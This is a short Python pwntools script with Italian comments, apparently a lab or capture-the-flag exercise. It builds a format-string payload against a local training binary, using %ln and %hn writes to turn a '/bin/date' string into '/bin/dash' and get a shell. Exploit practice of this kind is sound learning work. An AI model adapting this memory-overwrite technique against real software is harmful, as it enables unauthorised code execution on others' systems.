from pwn import *
from pwn import u16

def main():
    e = ELF('../Machines/heap_fmt')
    p = process(e.path)
    context.update(arch='amd64', os='linux') #È fondamentale l'inserimento del contesto, ovvero l'architettura e il sistema operativo dell'elf
    #Se non si ha la sicurezza del contesto basta riferirsi a quello dell'eseguibile con: 
    # context.binary = e

    payload = "%c"*4
    payload += "%{}c".format(e.sym.date_path + 11 - 4) # /bin/date --> /bin/dash
    payload += "%ln"
    payload += "%{}c".format((u16(b"sh") - e.sym.date_path - 11) % (2**16))
    payload += "%34$hn"
    
    print(payload)

    #p.sendline(payload)
    #p.interactive()




if __name__ == '__main__':
    main()